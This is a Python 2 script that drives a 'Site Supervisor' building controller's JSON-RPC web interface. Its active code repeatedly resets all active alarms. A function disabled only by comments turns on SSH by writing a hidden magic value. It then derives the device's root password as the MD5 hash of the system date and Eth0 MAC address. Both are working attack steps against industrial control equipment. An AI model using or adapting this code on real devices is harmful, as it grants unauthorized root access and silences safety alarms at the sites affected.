"""
"  This script is for reset Alarm
"  2017-12-22.
"""

import os
import sys
import re
import timeit
import time
import random
import urllib    
import urllib2
import httplib
import json
import hashlib   #md5

#define the http head data members:
user_agent = 'Mozilla/5.0 (Windows NT 6.1; Win64; x64)'
Language = 'en-US,en;q=0.8,zh-CN;q=0.6,zh;q=0.4'
Encoding = 'gzip, deflate'
XWith = 'XMLHttpRequest'
print "This script will help us to enable Site Supervisor SSH, and try to get its password"


"""
Request URL:http://10.161.93.24/cgi-bin/mgw.cgi?m=%7B%22jsonrpc%22%3A%222.0%22%2C%22method%22%3A%22GetSessionID%22%2C%22id%22%3A%221%22%7D&_=1511998756079
Request Method:GET
Status Code:200 OK
Remote Address:10.161.93.24:80
Referrer Policy:no-referrer-when-downgrade
Response Headers
view source
Content-Type:application/json; charset=utf-8
Date:Thu, 30 Nov 2017 00:36:25 GMT
Server:lighttpd/1.4.35
Transfer-Encoding:chunked
Request Headers
view source
Accept:*/*
Accept-Encoding:gzip, deflate
Accept-Language:zh-CN,zh;q=0.9
Connection:keep-alive
Host:10.161.93.24
Referer:http://10.161.93.24/
User-Agent:Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36
X-Requested-With:XMLHttpRequest
Query String Parameters
view source
view URL encoded
m:{"jsonrpc":"2.0","method":"GetSessionID","id":"1"}
_:1511998756079
"""

def getSessionID(ip):
	url_perfix = 'http://' + ip
	url_append = '/cgi-bin/mgw.cgi?m={"jsonrpc":"2.0","method":"GetSessionID","id":"1"}&_=1511998756079'
	url = url_perfix + url_append
   
	rep = urllib2.Request(url)
	response = urllib2.urlopen(rep)    
	resp_data = response.read()
	#print req_page

	decodejson = json.loads(resp_data)
	#print type(decodejson)
	#print decodejson
	print decodejson['result']['sid']
	return decodejson['result']['sid']

"""
Request URL:http://10.161.93.24/cgi-bin/mgw.cgi
Request Method:POST
Status Code:200 OK
Remote Address:10.161.93.24:80
Referrer Policy:no-referrer-when-downgrade
Response Headers
view source
Content-Type:application/json; charset=utf-8
Date:Thu, 30 Nov 2017 00:36:25 GMT
Server:lighttpd/1.4.35
Transfer-Encoding:chunked
Request Headers
view source
Accept:*/*
Accept-Encoding:gzip, deflate
Accept-Language:zh-CN,zh;q=0.9
Connection:keep-alive
Content-Length:176
Content-Type:application/x-www-form-urlencoded; charset=UTF-8
Host:10.161.93.24
Origin:http://10.161.93.24
Referer:http://10.161.93.24/
User-Agent:Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36
X-Requested-With:XMLHttpRequest
Form Data
view source
view URL encoded
m:{"jsonrpc":"2.0","method":"GetSystemInformation","params":{"sid":"9c55e5fd-9758-4beb-b181-f1e3819c7e62"},"id":"3"}
"""
def getSSVersion(ip, sessionid):
       	url_perfix = 'http://' + ip
       	url = url_perfix + '/cgi-bin/mgw.cgi'

       	Origin = url_perfix
       	Referer = url_perfix + '/'
       	headers = { 'User-Agent' : user_agent, 'X-Requested-With' : XWith, 'Referer' : Referer, 'Accept-Language' : Language, 'Accept-Encoding' : Encoding, 'Origin' : Origin}
       	
       	body_getVer = 'm={"jsonrpc":"2.0","method":"GetSystemInformation","params":{"sid":"' + sessionid + '"},"id":"3"}'
       	
       	req = urllib2.Request(url, body_getVer, headers)
       	response = urllib2.urlopen(req)
       	resp_data = response.read()

       	decodejson = json.loads(resp_data)
       	print decodejson['result']['unitversion']
       	return decodejson['result']['unitversion']


"""
Request URL:http://10.161.93.24/cgi-bin/mgw.cgi
Request Method:POST
Status Code:200 OK
Remote Address:10.161.93.24:80
Referrer Policy:no-referrer-when-downgrade
Response Headers
view source
Content-Type:application/json; charset=utf-8
Date:Wed, 29 Nov 2017 02:54:35 GMT
Server:lighttpd/1.4.35
Transfer-Encoding:chunked
Request Headers
view source
Accept:*/*
Accept-Encoding:gzip, deflate
Accept-Language:zh-CN,zh;q=0.9
Connection:keep-alive
Content-Length:174
Content-Type:application/x-www-form-urlencoded; charset=UTF-8
Host:10.161.93.24
Origin:http://10.161.93.24
Referer:http://10.161.93.24/
User-Agent:Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36
X-Requested-With:XMLHttpRequest
Form Data
view source
view URL encoded
m:{"jsonrpc":"2.0","method":"GetSystemInventory","params":{"sid":"f0dd7640-de1a-45ef-ab1c-27c4590db238"},"id":"8"}
"""
def getAppslist(ip, sessionid):
        url_perfix = 'http://' + ip
        url = url_perfix + '/cgi-bin/mgw.cgi'

        Origin = url_perfix
        Referer = url_perfix + '/'
        headers = { 'User-Agent' : user_agent, 'X-Requested-With' : XWith, 'Referer' : Referer, 'Accept-Language' : Language, 'Accept-Encoding' : Encoding, 'Origin' : Origin}

        body_getVer = 'm={"jsonrpc":"2.0","method":"GetSystemInventory","params":{"sid":"' + sessionid + '"},"id":"3"}'

        req = urllib2.Request(url, body_getVer, headers)
        response = urllib2.urlopen(req)
        resp_data = response.read()

        decodejson = json.loads(resp_data)
        #print decodejson['result']['aps']
        return decodejson['result']['aps']



"""
Request URL:http://10.161.93.24/cgi-bin/mgw.cgi
Request Method:POST
Status Code:200 OK
Remote Address:10.161.93.24:80
Referrer Policy:no-referrer-when-downgrade
Response Headers
view source
Content-Type:application/json; charset=utf-8
Date:Wed, 29 Nov 2017 02:53:48 GMT
Server:lighttpd/1.4.35
Transfer-Encoding:chunked
Request Headers
view source
Accept:*/*
Accept-Encoding:gzip, deflate
Accept-Language:zh-CN,zh;q=0.9
Connection:keep-alive
Content-Length:274
Content-Type:application/x-www-form-urlencoded; charset=UTF-8
Host:10.161.93.24
Origin:http://10.161.93.24
Referer:http://10.161.93.24/
User-Agent:Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36
X-Requested-With:XMLHttpRequest
Form Data
view source
view URL encoded
m:{"jsonrpc":"2.0","method":"SetPointValues","params":{"sid":"9c55e5fd-9758-4beb-b181-f1e3819c7e62","points":[{"ptr":"3470709668:SystemTime","val":"1511924026"}]},"id":"101"}
Name
SummaryDialog_tpl.html?_=2.05B00
mgw.cgi
mgw.cgi
"""
def setSiteSystemHeat(ip, sessionid, act_flag):
        #step 1: get the "System Settings" instance IID
        systemSetting_iid = ""
        apps_dict = getAppslist(ip, sessionid)
        for app in apps_dict:
                if (app['appname'] == 'System Settings') or (app['appname'] == 'System Sett'):
                        systemSetting_iid = app['iid']
                        break

        #step 2: create "SetPointValues" message for http request.
        url_perfix = 'http://' + ip
        url = url_perfix + '/cgi-bin/mgw.cgi'

        Origin = url_perfix
        Referer = url_perfix + '/'
        headers = { 'User-Agent' : user_agent, 'X-Requested-With' : XWith, 'Referer' : Referer, 'Accept-Language' : Language, 'Accept-Encoding' : Encoding, 'Origin' : Origin}
        if act_flag == '1':
                body_setHeat = 'm={"jsonrpc":"2.0","method":"SetPointValues","params":{"sid":"' + sessionid + '","points":[{"ptr":"' + systemSetting_iid + ':SiteSystemHeat","val":"69970925"}]},"id":"3"}'
        else:
                body_setHeat = 'm={"jsonrpc":"2.0","method":"SetPointValues","params":{"sid":"' + sessionid + '","points":[{"ptr":"' + systemSetting_iid + ':SiteSystemHeat","val":"1234567890"}]},"id":"3"}'

        rep = urllib2.Request(url, body_setHeat, headers)
        #print "rep:" + body_setHeat
        response = urllib2.urlopen(rep)
        resp_data = response.read()

        decodejson = json.loads(resp_data)
        if act_flag == '1':
                print " ---> Enable the SSH finished."
        else:
                print " ---> Disable the SSH finished."
                return 0;

        print " ---> Next will try to get the root's passwrod:"
        #m:{"jsonrpc":"2.0","method":"GetPointValues","params":{"sid":"f0dd7640-de1a-45ef-ab1c-27c4590db238","points":[{"ptr":"3470709668:Eth0MacAddress"}]},"id":"98"}
        body_getMac0 = 'm={"jsonrpc":"2.0","method":"GetPointValues","params":{"sid":"' + sessionid + '","points":[{"ptr":"' + systemSetting_iid + ':Eth0MacAddress"}, {"ptr":"' + systemSetting_iid + ':SystemTime"}]},"id":"3"}'
        req = urllib2.Request(url, body_getMac0, headers)
        response = urllib2.urlopen(req)
        resp_data = response.read()

        decodejson = json.loads(resp_data)
        members_info = decodejson['result']['points']

        mac_val = ""
        time_val = 0
        for val_inf in members_info:
                tmpPtr = val_inf['ptr']
                if (tmpPtr.find('Eth0MacAddress') > 0):
                        mac_val = val_inf['val']
                elif (tmpPtr.find('SystemTime') > 0):
                        time_val = val_inf['val']
                
        #print mac_val, time_val
        md5sum_input = time.strftime("%Y-%m-%d", time.localtime(float(time_val))) + "_" + mac_val
        #print md5sum_input
        print "\nYou can try to use the root passwword for SSh login: ", hashlib.md5(md5sum_input).hexdigest()

def resetAlarm(ip, sessionid):
        #m:{"jsonrpc":"2.0","method":"GetAlarms","params":{"sid":"193e2147-0daa-4df2-b6ec-753de3a99280"},"id":"11"}
        url_perfix = 'http://' + ip
        url = url_perfix + '/cgi-bin/mgw.cgi'
        Origin = url_perfix
        Referer = url_perfix + '/'
        headers = { 'User-Agent' : user_agent, 'X-Requested-With' : XWith, 'Referer' : Referer, 'Accept-Language' : Language, 'Accept-Encoding' : Encoding, 'Origin' : Origin}

        for num in range(1,10000):
                body_getVer = 'm={"jsonrpc":"2.0","method":"GetAlarms","params":{"sid":"' + sessionid + '"},"id":"3"}'
                req = urllib2.Request(url, body_getVer, headers)
                response = urllib2.urlopen(req)
                resp_data = response.read()
                decodejson = json.loads(resp_data)
                #decodejson['result'].isMember('alarms')
                
                alarms_dict = decodejson['result']['alarms']
                #resolution:"ACTIVE"
                for alarm in alarms_dict:
                        if (alarm['resolution'] == 'ACTIVE'):
                                #print alarm[]
                                body_getVer = 'm={"jsonrpc":"2.0","method":"ResetAlarm","params":{"sid":"' + sessionid + '", "uid": "' + alarm["uid"] + '","username":"user","unitnum":"' + alarm["unitnum"] + '", "devicetype":"SS"},"id":"3"}'
                                print body_getVer
                                req = urllib2.Request(url, body_getVer, headers)
                                response = urllib2.urlopen(req)
                                time.sleep(1) 
                        else:
                                continue
                pass

                print "num: %d" %num
#main active:

SS_ip = raw_input("\n ---> Please input your SS ip: ")
#Sid = getSessionID(SS_ip)
print "\n You can get user's sid via Web UI/Browser."
Sid = raw_input("---> Please input your user's sid: ")
resetAlarm(SS_ip, Sid)
#Version = getSSVersion(SS_ip, Sid)
#if (Version.find("B") > 0  or Version.find("F") > 0 ):
#        act_flag = raw_input("\n ---> Next choice enable(1)/disabel(0) SSH:")
#        setSiteSystemHeat(SS_ip, Sid, act_flag)
#else:
#        print " ---> This Versin " + Version + " cannot be enabled/disabeled SSH!!!"

